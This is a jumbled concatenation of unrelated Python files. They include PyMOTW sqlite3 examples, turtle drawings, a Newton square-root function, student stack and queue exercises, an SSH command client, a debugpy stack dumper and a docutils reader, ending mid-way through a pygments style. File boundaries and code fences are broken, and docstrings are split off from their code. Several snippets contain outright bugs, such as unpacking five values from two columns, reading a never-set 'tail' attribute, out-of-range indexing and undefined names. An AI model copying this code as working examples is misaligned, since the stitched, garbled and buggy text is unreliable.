```pyDefining a custom type.```


```py

#end_pymotw_header
import pickle
import sqlite3

db_filename = 'todo.db'


def adapter_func(obj):
    """Convert from in-memory to storage representation.
    """
    print('adapter_func({})\n'.format(obj))
    return pickle.dumps(obj)


def converter_func(data):
    """Convert from storage to in-memory representation.
    """
    print('converter_func({!r})\n'.format(data))
    return pickle.loads(data)


class MyObj:

    def __init__(self, arg):
        self.arg = arg

    def __str__(self):
        return 'MyObj({!r})'.format(self.arg)


# Register the functions for manipulating the type.
sqlite3.register_adapter(MyObj, adapter_func)
sqlite3.register_converter("MyObj", converter_func)

# Create some objects to save.  Use a list of tuples so we
# can pass this sequence directly to executemany().
to_save = [
    (MyObj('this is a value to save'),),
    (MyObj(42),),
]

with sqlite3.connect(
        db_filename,
        detect_types=sqlite3.PARSE_COLNAMES) as conn:
    # Create a table with column of type "text"
    conn.execute("""
    create table if not exists obj2 (
        id    integer primary key autoincrement not null,
        data  text
    )
    """)
    cursor = conn.cursor()

    # Insert the objects into the database
    cursor.executemany("insert into obj2 (data) values (?)",
                       to_save)

    # Query the database for the objects just saved,
    # using a type specifier to convert the text
    # to objects.
    cursor.execute(
        'select id, data as "pickle [MyObj]" from obj2',
    )
    for obj_id, obj in cursor.fetchall():
        print('Retrieved', obj_id, obj)
        print('  with type', type(obj))
        print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyQuery tasks in the database.```


```py

#end_pymotw_header
import sqlite3
import sys

db_filename = 'todo.db'

sql = "select id, details, deadline from task"


def show_deadline(conn):
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute(sql)
    row = cursor.fetchone()
    for col in ['id', 'details', 'deadline']:
        print('  {:<8}  {!r:<26} {}'.format(
            col, row[col], type(row[col])))
    return


print('Without type detection:')
with sqlite3.connect(db_filename) as conn:
    show_deadline(conn)

print('\nWith type detection:')
with sqlite3.connect(db_filename,
                     detect_types=sqlite3.PARSE_DECLTYPES,
                     ) as conn:
    show_deadline(conn)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyIllustrate the effect of isolation levels.```


```py

#end_pymotw_header
import logging
import sqlite3
import sys
import threading
import time

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s (%(threadName)-10s) %(message)s',
)

db_filename = 'todo.db'
isolation_level = sys.argv[1]


def writer():
    with sqlite3.connect(
            db_filename,
            isolation_level=isolation_level) as conn:
        cursor = conn.cursor()
        cursor.execute('update task set priority = priority + 1')
        logging.debug('waiting to synchronize')
        ready.wait()  # synchronize threads
        logging.debug('PAUSING')
        time.sleep(1)
        conn.commit()
        logging.debug('CHANGES COMMITTED')


def reader():
    with sqlite3.connect(
            db_filename,
            isolation_level=isolation_level) as conn:
        cursor = conn.cursor()
        logging.debug('waiting to synchronize')
        ready.wait()  # synchronize threads
        logging.debug('wait over')
        cursor.execute('select * from task')
        logging.debug('SELECT EXECUTED')
        cursor.fetchall()
        logging.debug('results fetched')


if __name__ == '__main__':
    ready = threading.Event()

    threads = [
        threading.Thread(name='Reader 1', target=reader),
        threading.Thread(name='Reader 2', target=reader),
        threading.Thread(name='Writer 1', target=writer),
        threading.Thread(name='Writer 2', target=writer),
    ]

    [t.start() for t in threads]

    time.sleep(1)
    logging.debug('setting ready')
    ready.set()

    [t.join() for t in threads]

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDumping a database```


```py

#end_pymotw_header
import sqlite3

schema_filename = 'todo_schema.sql'

with sqlite3.connect(':memory:') as conn:
    conn.row_factory = sqlite3.Row

    print('Creating schema')
    with open(schema_filename, 'rt') as f:
        schema = f.read()
    conn.executescript(schema)

    print('Inserting initial data')
    conn.execute("""
    insert into project (name, description, deadline)
    values ('pymotw', 'Python Module of the Week',
            '2010-11-01')
    """)
    data = [
        ('write about select', 'done', '2010-10-03',
         'pymotw'),
        ('write about random', 'waiting', '2010-10-10',
         'pymotw'),
        ('write about sqlite3', 'active', '2010-10-17',
         'pymotw'),
    ]
    conn.executemany("""
    insert into task (details, status, deadline, project)
    values (?, ?, ?, ?)
    """, data)

    print('Dumping:')
    for text in conn.iterdump():
        print(text)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLoad bulk data from a CSV file.```


```py

#end_pymotw_header
import csv
import sqlite3
import sys

db_filename = 'todo.db'
data_filename = sys.argv[1]

SQL = """
insert into task (details, priority, status, deadline, project)
values (:details, :priority, 'active', :deadline, :project)```


```py

with open(data_filename, 'rt') as csv_file:
    csv_reader = csv.DictReader(csv_file)

    with sqlite3.connect(db_filename) as conn:
        cursor = conn.cursor()
        cursor.executemany(SQL, csv_reader)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyQuery tasks in the database.```


```py

#end_pymotw_header
import sqlite3

db_filename = 'todo.db'

with sqlite3.connect(db_filename) as conn:

    # Load the full-text-search extension module
    conn.enable_load_extension(True)
    conn.load_extension('fts3.so')
    conn.enable_load_extension(False)

    cursor = conn.cursor()

    cursor.execute("""
    create virtual table searchable_task using fts3(details);
    insert into searchable_task select (id, details) from task;
    """)

    cursor.execute(
        """
        select id, details from searchable_task
        where searchable_task match ?
        """,
        ('write',),
    )
    for row in cursor.fetchall():
        task_id, priority, details, status, deadline = row
        print('{:2d} [{:d}] {:<20} [{:<8}] ({})'.format(
            task_id, priority, details, status, deadline))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyWorking with an in-memory database```


```py

#end_pymotw_header
import sqlite3

schema_filename = 'todo_schema.sql'

with sqlite3.connect(':memory:') as conn:
    conn.row_factory = sqlite3.Row

    print('Creating schema')
    with open(schema_filename, 'rt') as f:
        schema = f.read()
    conn.executescript(schema)

    print('Inserting initial data')
    conn.execute("""
    insert into project (name, description, deadline)
    values ('pymotw', 'Python Module of the Week', '2010-11-01')
    """)
    data = [
        ('write about select', 'done', '2010-10-03',
         'pymotw'),
        ('write about random', 'waiting', '2010-10-10',
         'pymotw'),
        ('write about sqlite3', 'active', '2010-10-17',
         'pymotw'),
    ]
    conn.executemany("""
    insert into task (details, status, deadline, project)
    values (?, ?, ?, ?)
    """, data)

    print('Looking for tasks...')
    cursor = conn.cursor()
    cursor.execute("""
    select id, priority, status, deadline, details from task
    where project = 'pymotw' order by deadline
    """)
    for row in cursor.fetchall():
        print('{:2d} [{:d}] {:<25} [{:<8}] ({})'.format(
            row['id'], row['priority'], row['details'],
            row['status'], row['deadline'],
        ))

with sqlite3.connect(':memory:') as conn2:
    print('\nLooking for tasks in second connection...')
    cursor = conn2.cursor()
    cursor.execute("""
    select id, priority, status, deadline, details from task
    where project = 'pymotw' order by deadline
    """)
    for row in cursor.fetchall():
        print('{:2d} [{:d}] {:<25} [{:<8}] ({})'.format(
            row['id'], row['priority'], row['details'],
            row['status'], row['deadline'],
        ))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyUse a regular expression in a query.```


```py

#end_pymotw_header
import re
import sqlite3

db_filename = 'todo.db'


def regexp(pattern, input):
    return bool(re.match(pattern, input))


with sqlite3.connect(db_filename) as conn:
    conn.row_factory = sqlite3.Row
    conn.create_function('regexp', 2, regexp)
    cursor = conn.cursor()

    pattern = '.*[wW]rite [aA]bout.*'

    cursor.execute(
        """
        select id, priority, details, status, deadline from task
        where details regexp :pattern
        order by deadline, priority
        """,
        {'pattern': pattern},
    )

    for row in cursor.fetchall():
        task_id, priority, details, status, deadline = row
        print('{:2d} [{:d}] {:<25} [{:<8}] ({})'.format(
            task_id, priority, details, status, deadline))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyQuery tasks in the database.```


```py

#end_pymotw_header
import sqlite3

db_filename = 'todo.db'

with sqlite3.connect(db_filename) as conn:
    # Change the row factory to use Row
    conn.row_factory = sqlite3.Row

    cursor = conn.cursor()

    cursor.execute("""
    select name, description, deadline from project
    where name = 'pymotw'
    """)
    name, description, deadline = cursor.fetchone()

    print('Project details for {} ({})\n  due {}'.format(
        description, name, deadline))

    cursor.execute("""
    select id, priority, status, deadline, details from task
    where project = 'pymotw' order by deadline
    """)

    print('\nNext 5 tasks:')
    for row in cursor.fetchmany(5):
        print('{:2d} [{:d}] {:<25} [{:<8}] ({})'.format(
            row['id'], row['priority'], row['details'],
            row['status'], row['deadline'],
        ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyQuery tasks in the database.```


```py

#end_pymotw_header
import sqlite3

db_filename = 'todo.db'

with sqlite3.connect(db_filename) as conn:
    cursor = conn.cursor()

    cursor.execute("""
    select id, priority, details, status, deadline from task
    where project = 'pymotw'
    """)

    for row in cursor.fetchall():
        task_id, priority, details, status, deadline = row
        print('{:2d} [{:d}] {:<25} [{:<8}] ({})'.format(
            task_id, priority, details, status, deadline))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyQuery tasks in the database.```


```py

#end_pymotw_header
import sqlite3

db_filename = 'todo.db'

with sqlite3.connect(db_filename) as conn:
    cursor = conn.cursor()

    cursor.execute("""
    select name, description, deadline from project
    where name = 'pymotw'
    """)
    name, description, deadline = cursor.fetchone()

    print('Project details for {} ({})\n  due {}'.format(
        description, name, deadline))

    cursor.execute("""
    select id, priority, details, status, deadline from task
    where project = 'pymotw' order by deadline
    """)

    print('\nNext 5 tasks:')
    for row in cursor.fetchmany(5):
        task_id, priority, details, status, deadline = row
        print('{:2d} [{:d}] {:<25} [{:<8}] ({})'.format(
            task_id, priority, details, status, deadline))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyControl access to columns using an authorizer function.```


```py

#end_pymotw_header
import sqlite3

db_filename = 'todo.db'


def authorizer_func(action, table, column, sql_location, ignore):
    print('\nauthorizer_func({}, {}, {}, {}, {})'.format(
        action, table, column, sql_location, ignore))

    response = sqlite3.SQLITE_OK  # be permissive by default

    if action == sqlite3.SQLITE_SELECT:
        print('requesting permission to run a select statement')
        response = sqlite3.SQLITE_OK

    elif action == sqlite3.SQLITE_READ:
        print('requesting access to column {}.{} from {}'.format(
            table, column, sql_location))
        if column == 'details':
            print('  ignoring details column')
            response = sqlite3.SQLITE_IGNORE
        elif column == 'priority':
            print('  preventing access to priority column')
            response = sqlite3.SQLITE_DENY

    return response


with sqlite3.connect(db_filename) as conn:
    conn.row_factory = sqlite3.Row
    conn.set_authorizer(authorizer_func)

    print('Using SQLITE_IGNORE to mask a column value:')
    cursor = conn.cursor()
    cursor.execute("""
    select id, details from task where project = 'pymotw'
    """)
    for row in cursor.fetchall():
        print(row['id'], row['details'])

    print('\nUsing SQLITE_DENY to deny access to a column:')
    cursor.execute("""
    select id, priority from task where project = 'pymotw'
    """)
    for row in cursor.fetchall():
        print(row['id'], row['details'])

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyIllustrate the effect of autocommit mode.```


```py

#end_pymotw_header
import sqlite3
import sys
import threading
import time

db_filename = 'todo.db'
isolation_level = None  # autocommit mode


def reader(conn):
    print('Starting thread')
    try:
        cursor = conn.cursor()
        cursor.execute('select * from task')
        cursor.fetchall()
        print('results fetched')
    except Exception as err:
        print('ERROR:', err)


if __name__ == '__main__':
    with sqlite3.connect(db_filename,
                         isolation_level=isolation_level,
                         ) as conn:
        t = threading.Thread(name='Reader 1',
                             target=reader,
                             args=(conn,),
                             )
        t.start()
        t.join()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating the schema in an sqlite3 database.```


```py

#end_pymotw_header
import sqlite3

db_filename = 'todo.db'


def show_projects(conn):
    cursor = conn.cursor()
    cursor.execute('select name, description from project')
    for name, desc in cursor.fetchall():
        print('  ', name)


with sqlite3.connect(db_filename) as conn1:
    print('Before changes:')
    show_projects(conn1)

    # Insert in one cursor
    cursor1 = conn1.cursor()
    cursor1.execute("""
    insert into project (name, description, deadline)
    values ('virtualenvwrapper', 'Virtualenv Extensions',
            '2011-01-01')
    """)

    print('\nAfter changes in conn1:')
    show_projects(conn1)

    # Select from another connection, without committing first
    print('\nBefore commit:')
    with sqlite3.connect(db_filename) as conn2:
        show_projects(conn2)

    # Commit then select from another connection
    conn1.commit()
    print('\nAfter commit:')
    with sqlite3.connect(db_filename) as conn3:
        show_projects(conn3)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating the schema in an sqlite3 database.```


```py

#end_pymotw_header
import sqlite3

db_filename = 'todo.db'


def show_projects(conn):
    cursor = conn.cursor()
    cursor.execute('select name, description from project')
    for name, desc in cursor.fetchall():
        print('  ', name)


with sqlite3.connect(db_filename) as conn:

    print('Before changes:')
    show_projects(conn)

    try:

        # Insert
        cursor = conn.cursor()
        cursor.execute("""delete from project
                       where name = 'virtualenvwrapper'
                       """)

        # Show the settings
        print('\nAfter delete:')
        show_projects(conn)

        # Pretend the processing caused an error
        raise RuntimeError('simulated error')

    except Exception as err:
        # Discard the changes
        print('ERROR:', err)
        conn.rollback()

    else:
        # Save the changes
        conn.commit()

    # Show the results
    print('\nAfter rollback:')
    show_projects(conn)

import turtle


def square():
    win = turtle.Screen()
    win.bgcolor("white")
    jack = turtle.Turtle()
    for x in range(1, 5):
        jack.forward(100)
        jack.right(90)
    win.exitonclick()


square()

import math


def fx(x: float, a: float) -> float:
    return math.pow(x, 2) - a


def fx_derivative(x: float) -> float:
    return 2 * x


def get_initial_point(a: float) -> float:
    start = 2.0

    while start <= a:
        start = math.pow(start, 2)

    return start


def square_root_iterative(
    a: float, max_iter: int = 9999, tolerance: float = 0.00000000000001
) -> float:
    """
    Square root is aproximated using Newtons method.
    https://en.wikipedia.org/wiki/Newton%27s_method

    >>> all(abs(square_root_iterative(i)-math.sqrt(i)) <= .00000000000001
    ...     for i in range(500))
    True

    >>> square_root_iterative(-1)
    Traceback (most recent call last):
        ...
    ValueError: math domain error

    >>> square_root_iterative(4)
    2.0

    >>> square_root_iterative(3.2)
    1.788854381999832

    >>> square_root_iterative(140)
    11.832159566199232
    """

    if a < 0:
        raise ValueError("math domain error")

    value = get_initial_point(a)

    for i in range(max_iter):
        prev_value = value
        value = value - fx(value, a) / fx_derivative(value)
        if abs(prev_value - value) < tolerance:
            return value

    return value


if __name__ == "__main__":
    from doctest import testmod

    testmod()
````

````py Function uses prime factorisation method
 to find square root of number """

def prime_factors(c):
 pos = 2
 factors = []
 while (pos <= c):
  if (c % pos == 0):
   c = c // pos
   factors.append(pos)
   continue
  else:
   pos = pos + 1
 return factors

def extract_common(li):
 final = []
 if (len(li) % 2 != 0):
  return "Number is not perfect root."
 else:
  pre = len(li) - 1
  for n in range(0, pre, 2):
   a = li[n]
   b = li[n + 1]
   if (a == b):
    final.append(b)
   else:
    return "Number is not perfect root."
 return final

def square_root(take_in):
 res = 1
 for c in take_in:
  res *= c
 return res

get_num = int(raw_input("\nNumber : "))
print square_root(extract_common(prime_factors(get_num))), " "
# pre code


def square():
    print(" ")
    makeUse = raw_input("Square or Cube : ")
    if makeUse.strip() == "Square":
        print(" ")
        user = int(raw_input("Enter number to get square : "))
        square = user ** 2
        print(" ")
        print("Square of the number " + str(user) + " is " + str(square))
    elif makeUse.strip() == "Cube":
        print(" ")
        userAgain = int(raw_input("Enter number to get square : "))
        cube = userAgain ** 3
        print(" ")
        print("Cube of the number " + str(userAgain) + " is " + str(cube))


# main code

while True:
    print("Hello,")
    print(" ")
    startOrEnd = raw_input("Start or End : ")
    print(" ")
    if startOrEnd.strip() == "Start":
        print(square())
    elif startOrEnd.strip() == "End":
        print(" ")
        print(" ")
        print("Program Ended......")
        break
    else:
        print(" ")
        print("Try Again")
        continue
    startagain = "Start again or End : "
    print(" ")
    if startagain.strip() == "Start again":
        print(" ")
        print("Starting again.....")
        continue
    elif startagain == "End":
        print(" ")
        print(" ")
        break
    else:
        print(" ")
        print("Try Again")
        continue

import os
from subprocess import Popen, PIPE

from commander.utils import PStatus


class SSHClient(object):
    def __init__(self, host, identity_file=None, jumphost=None,
                 control_master=False):
        self.host = host
        self.identity_file = identity_file
        self.jumphost = jumphost
        self.control_master = control_master

    def run(self, cmd):
        raise NotImplementedError()


class SSHExecClient(SSHClient):
    def run(self, cmd):
        extra = []
        if self.jumphost:
            extra.append('-o "ProxyCommand ssh -A %s nc %%h %%p' %
                          self.jumphost)

        if self.control_master:
            extra.append('-o "ControlMaster auto"')
            extra.append('-o "ControlPath /tmp/commander_mux_%h_%p_%r"')
            extra.append('-o "ControlPersist 10m"')

        if self.identity_file:
            if os.path.isfile(self.identity_file):
                extra.append('-i %s' % self.identity_file)
            else:
                raise ValueError("identity_file should be a valid file")

        cmd = """ssh -T %s %s <<'EOF'
            %s
EOF""" % (" ".join(extra), self.host, cmd)
        p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
        out, err = p.communicate()
        return PStatus(out=out, err=err, code=p.returncode)

from heapq import *

r, thm = int(0), int(0)
print("Enter the Number of Requests : ") #Number of I/O Requets
req = int(input())
print("Enter the Initial Head Position : ") #Initial position of Disk Head
hp = int(input())
position = hp
print("Enter the Seek Rate : ")
srate = int(input())
print("Enter the Requests : ")
arr = [ int(input()) for i in range(req)]
heap = []
n = len(arr)
print(hp, end='')
while len(arr) > 0:
    for r in arr:
        heappush(heap, [abs(position-r),r]) #Stores the distance to location and correspoding location
    x=heappop(heap)[1] #Pops the lowest distance's corresponding location
    thm+=abs(position-x)
    position=x
    print(" -> ",x, end='')
    arr.remove(x) #Removes the location, since the request has been satisfied
    heap = []
stime=thm*srate
print("\nThe Total Head Movement is",thm)
print("The Seek Time is",stime)

class Stack():
    def __init__(self):
        self.stack = []
    def push(self, value):
        self.stack.append(value)
    def pop(self):
        if self.size() > 0:
            return self.stack.pop()
        else:
            return None
    def size(self):
        return len(self.stack)```


```py
A queue is a data structure whose primary purpose is to store and
return elements in First In First Out order.
1. Implement the Queue class using an array as the underlying storage structure.
   Make sure the Queue tests pass.
2. Re-implement the Queue class, this time using the linked list implementation
   as the underlying storage structure.
   Make sure the Queue tests pass.
3. What is the difference between using an array vs. a linked list when
   implementing a Queue?

Stretch: What if you could only use instances of your Stack class to implement the Queue?
         What would that look like? How many Stacks would you need? Try it!```


```py
# class Queue:
#     def __init__(self):
#         self.size = 0
#         self.storage = []

#     def __len__(self):
#         return self.size
#         # other option return len(self.storage)

#     def enqueue(self, value):
#         self.storage.append(value)
#             self.size += 1


#     def dequeue(self):
#         if self.size == 0:
#             return None
#         self.size -= 1
#         return self.storage.pop(0)

from singly_linked_list import LinkedList

class Stack:
    def __init__(self):
        self.size = 0
        self.storage = LinkedList()

    def __len__(self):
        return self.size
        # other option return len(self.storage)

    def enqueue(self, value):
        self.storage.add_to_tail(value)
        self.size += 1


    def dequeue(self):
        if self.size == 0:
            return None
        self.size -= 1
        return self.storage.remove_tail()
class LinkedListNode:
    def __init__(self, data):
        self.value = data
        self.next = None


class Stack:
    def __init__(self):
        self.head = None
        self.end = None

    def push(self, value):  # for stacks we insert at the head
        new_node = LinkedListNode(value)
        # is the list empty?
        if self.head is None and self.end is None:
            self.head = new_node
            self.end = new_node
        else:  # add to head
            new_node.next = self.head
            self.head = new_node

    def pop(self):  # removes from the head
        # is the list empty:
        if self.head is None:
            return

        value = self.head.value
        # remove the node at the head and move the head
        self.head = self.head.next
        if self.head is None:
            # no more items
            self.tail = None
        return value


q = Stack()
q.push(3)
q.push(34)
q.push(35)
q.push(6)

print(q.tail.value)

# Stack grows downward.
#
# 700: 0
#
# 699: 2  (a)   main's stack frame
# 698: 14 (b)
#
# 697: 2  (x)   mult2's stack frame
# 696: 7  (y)
# 695: 14 (z)  <-- SP

def mult2(x, y):
    z = x * y
    return z

def main():
    a = 2

    b = mult2(a, 7)

    print(b) # 14```


```py
Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
getMin() -- Retrieve the minimum element in the stack.```


```py


class MinStack:
    def __init__(self):
        """
        initialize your data structure here.
        """
        self.stack = []

    def push(self, x: int) -> None:
        # store every element as a pair (element, min_so_far)
        if len(self.stack) == 0:
            self.stack.append([x, x])
        else:
            pre_min = self.stack[-1][1]
            self.stack.append([x, min(x, pre_min)])

    def pop(self) -> None:
        if self.stack:
            self.stack.pop()

    def top(self) -> int:
        if self.stack:
            return self.stack[-1][0]

    def getMin(self) -> int:
        if self.stack:
            return self.stack[-1][1]


minStack = MinStack()
minStack.push(-2)
minStack.push(0)
minStack.push(-3)
minStack.getMin()
minStack.pop()
minStack.top()
minStack.getMin()

import sys


class Stack:
    # initialize the constructor of empty array
    def __init__(self, arr, limit):
        self.arr = arr
        self.arr = []
        self.limit = limit

    # defining an method to get all the elements in the que
    def print_elements(self):
        for i in range(len(self.arr)):
            print(self.arr[i])

    # defining an method to append elements in a stack
    def push(self, i):
        # limiting the stack size
        if len(self.arr) <= self.limit - 1:
            self.arr.append(i)
        else:
            # limit of stack exceeds stack overflow
            print("elements are : ")
            for i in range(len(self.arr)):
                print(self.arr[i])
            print("stack overflow occurred")
            sys.exit()

    # defining an method to pop an element from the array
    def pop(self):
        self.arr.pop()

    # defining an method to check if the stack is empty
    def is_empty(self):
        n = len(self.arr)
        if n == 0:
            print("array is empty")
        else:
            print("array is not empty")

    # defining an method to get the top element
    def top(self):
        n = len(self.arr)
        return self.arr[n]


# initialize the object
sta = Stack([], 4)

# pushing an element to the array
sta.push(1)
sta.push(2)
sta.push(1)
sta.push(2)
sta.push(2)
sta.push(2)
# printing all the elements in the stack
sta.print_elements()
# popping the element from the array
sta.pop()

# printing all the elements in the stack
sta.print_elements()

# popping an element from the array
sta.pop()

# checking if the array is empty or not
sta.is_empty()

class Stack:
    # initialize the constructor of empty array
    def __init__(self, arr, limit):
        self.arr = arr
        self.arr = []
        self.limit = limit
        self.max_array = []

    # defining an method to get all the elements in the que
    def print_elements(self):
        for i in range(len(self.arr)):
            print(self.arr[i])

    # defining an method to append elements in a stack
    def push(self, i):
        # limiting the stack size
        if len(self.arr) <= self.limit - 1:
            self.arr.append(i)

    def maxPush(self):

        # if len(self.arr) <= self.limit - 1:
        if len(self.arr) == 1:
            self.max_array.append(self.arr[len(self.arr) - 1])
        elif self.arr[len(self.arr) - 1] < self.max_array[len(self.max_array) - 1]:
            self.max_array.append(self.max_array[len(self.max_array) - 1])
        else:
            self.max_array.append(self.arr[len(self.arr) - 1])

        print("max value is : " + str(self.max_array[len(self.max_array) - 1]))

    # defining an method to pop an element from the array
    def pop(self):
        self.arr.pop()
        max_array.pop()

    # defining an method to get the top element
    def top(self):
        n = len(self.arr)
        return self.arr[n]


# initialize the object
sta = Stack([], 6)


# pushing an element to the array
sta.push(10)
sta.maxPush()
print("-------------------")
sta.push(2)
sta.maxPush()
print("-------------------")
sta.push(3)
sta.maxPush()
print("-------------------")
sta.push(4)
sta.maxPush()
print("-------------------")
sta.push(5)
sta.maxPush()
print("-------------------")
sta.push(6)
sta.maxPush()
print("-------------------")
# printing all the elements in the stack
# sta.print_elements()
# popping the element from the array
# sta.pop()

# A complete working Python program to demonstrate all
# stack operations using a doubly linked list


class Node:
    def __init__(self, data):
        self.data = data  # Assign data
        self.next = None  # Initialize next as null
        self.prev = None  # Initialize prev as null


class Stack:
    """
    >>> stack = Stack()
    >>> stack.is_empty()
    True
    >>> stack.print_stack()
    stack elements are:
    >>> for i in range(4):
    ...     stack.push(i)
    ...
    >>> stack.is_empty()
    False
    >>> stack.print_stack()
    stack elements are:
    3->2->1->0->
    >>> stack.top()
    3
    >>> len(stack)
    4
    >>> stack.pop()
    3
    >>> stack.print_stack()
    stack elements are:
    2->1->0->
    """

    def __init__(self):
        self.head = None

    def push(self, data):
        """add a Node to the stack"""
        if self.head is None:
            self.head = Node(data)
        else:
            new_node = Node(data)
            self.head.prev = new_node
            new_node.next = self.head
            new_node.prev = None
            self.head = new_node

    def pop(self):
        """pop the top element off the stack"""
        if self.head is None:
            return None
        else:
            temp = self.head.data
            self.head = self.head.next
            self.head.prev = None
            return temp

    def top(self):
        """return the top element of the stack"""
        return self.head.data

    def __len__(self):
        temp = self.head
        count = 0
        while temp is not None:
            count += 1
            temp = temp.next
        return count

    def is_empty(self):
        return self.head is None

    def print_stack(self):
        print("stack elements are:")
        temp = self.head
        while temp is not None:
            print(temp.data, end="->")
            temp = temp.next


# Code execution starts here
if __name__ == "__main__":

    # Start with the empty stack
    stack = Stack()

    # Insert 4 at the beginning. So stack becomes 4->None
    print("Stack operations using Doubly LinkedList")
    stack.push(4)

    # Insert 5 at the beginning. So stack becomes 4->5->None
    stack.push(5)

    # Insert 6 at the beginning. So stack becomes 4->5->6->None
    stack.push(6)

    # Insert 7 at the beginning. So stack becomes 4->5->6->7->None
    stack.push(7)

    # Print the stack
    stack.print_stack()

    # Print the top element
    print("\nTop element is ", stack.top())

    # Print the stack size
    print("Size of the stack is ", len(stack))

    # pop the top element
    stack.pop()

    # pop the top element
    stack.pop()

    # two elements have now been popped off
    stack.print_stack()

    # Print True if the stack is empty else False
    print("\nstack is empty:", stack.is_empty())

# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See LICENSE in the project root
# for license information.

from __future__ import absolute_import, division, print_function, unicode_literals
````

`pyProvides facilities to dump all stacks of all threads in the process.`

```py

import os
import sys
import time
import threading
import traceback

from debugpy.common import log


def dump():
    """Dump stacks of all threads in this process, except for the current thread.
    """

    tid = threading.current_thread().ident
    pid = os.getpid()

    log.info("Dumping stacks for process {0}...", pid)

    for t_ident, frame in sys._current_frames().items():
        if t_ident == tid:
            continue

        for t in threading.enumerate():
            if t.ident == tid:
                t_name = t.name
                t_daemon = t.daemon
                break
        else:
            t_name = t_daemon = "<unknown>"

        stack = "".join(traceback.format_stack(frame))
        log.info(
            "Stack of thread {0} (tid={1}, pid={2}, daemon={3}):\n\n{4}",
            t_name,
            t_ident,
            pid,
            t_daemon,
            stack,
        )

    log.info("Finished dumping stacks for process {0}.", pid)


def dump_after(secs):
    """Invokes dump() on a background thread after waiting for the specified time.
    """

    def dumper():
        time.sleep(secs)
        try:
            dump()
        except:
            log.swallow_exception()

    thread = threading.Thread(target=dumper)
    thread.daemon = True
    thread.start()

# Python program to find n-th stair
# using step size 1 or 2 or 3.

# Returns count of ways to reach n-th
# stair using 1 or 2 or 3 steps.
def counting_stairs(n):
    if (n == 1 or n == 0):
        print(n)
        return 1
    elif (n == 2):
        print(n)
        return 2
    else:
        print(n - 3, n - 2, n - 1)
        return counting_stairs(n - 3) + counting_stairs(n - 2) + counting_stairs(n - 1)


# Driver code
n = 5
print(counting_stairs(n))
# $Id: standalone.py 4802 2006-11-12 18:02:17Z goodger $
# Author: David Goodger <goodger@python.org>
# Copyright: This module has been placed in the public domain.
```

````py
Standalone file Reader for the reStructuredText markup syntax.```


```py

__docformat__ = 'reStructuredText'


import sys
from docutils import frontend, readers
from docutils.transforms import frontmatter, references, misc


class Reader(readers.Reader):

    supported = ('standalone',)
    """Contexts this reader supports."""

    document = None
    """A single document tree."""

    settings_spec = (
        'Standalone Reader',
        None,
        (('Disable the promotion of a lone top-level section title to '
          'document title (and subsequent section title to document '
          'subtitle promotion; enabled by default).',
          ['--no-doc-title'],
          {'dest': 'doctitle_xform', 'action': 'store_false', 'default': 1,
           'validator': frontend.validate_boolean}),
         ('Disable the bibliographic field list transform (enabled by '
          'default).',
          ['--no-doc-info'],
          {'dest': 'docinfo_xform', 'action': 'store_false', 'default': 1,
           'validator': frontend.validate_boolean}),
         ('Activate the promotion of lone subsection titles to '
          'section subtitles (disabled by default).',
          ['--section-subtitles'],
          {'dest': 'sectsubtitle_xform', 'action': 'store_true', 'default': 0,
           'validator': frontend.validate_boolean}),
         ('Deactivate the promotion of lone subsection titles.',
          ['--no-section-subtitles'],
          {'dest': 'sectsubtitle_xform', 'action': 'store_false'}),
         ))

    config_section = 'standalone reader'
    config_section_dependencies = ('readers',)

    def get_transforms(self):
        return readers.Reader.get_transforms(self) + [
            references.Substitutions,
            references.PropagateTargets,
            frontmatter.DocTitle,
            frontmatter.SectionSubTitle,
            frontmatter.DocInfo,
            references.AnonymousHyperlinks,
            references.IndirectHyperlinks,
            references.Footnotes,
            references.ExternalTargets,
            references.InternalTargets,
            references.DanglingReferences,
            misc.Transitions,
            ]

Python 3.7.1 (v3.7.1:260ec2c36a, Oct 20 2018, 14:05:16) [MSC v.1915 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license()" for more information.
>>> import turtle
>>> star=turtle.Turtle()
>>> win=turtle.Screen()
>>> win.setworldcoordinates(-100,-100,100,100)
>>> for i in range(5):
 star.forward(50)
 star.right(144)


>>>

from turtle import *


def drawStar(x, y):
    pu()
    goto(x, y)
    pd()
    # set heading: 0
    seth(0)
    for i in range(5):
        fd(40)
        rt(144)


for x in range(0, 250, 50):
    drawStar(x, 0)

done()
````

````py
    pygments.styles.stata_dark
    ~~~~~~~~~~~~~~~~~~~~~~~~~~

    Dark style inspired by Stata's do-file editor. Note this is not
    meant to be a complete style, just for Stata's file formats.


    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
    Number, Operator, Whitespace, Generic, Text


class StataDarkStyle(Style):

    default_style = ''

    background_color = "#232629"
    highlight_color = "#49483e"

    styles = {
        Whitespace:            '#bbbbbb',
        Error:                 'bg:#e3d2d2 #a61717',
        Text:                  '#cccccc',
        String:                '#51cc99',
        Number:                '#4FB8CC',
        Operator:              '',
        Name.Function:         '#6a6aff',
        Name.Other:            '#e2828e',
        Keyword:               'bold #7686bb',
        Keyword.Constant:      '',
        Comment:               'italic #777777',
        Name.Variable:         'bold #7AB4DB',
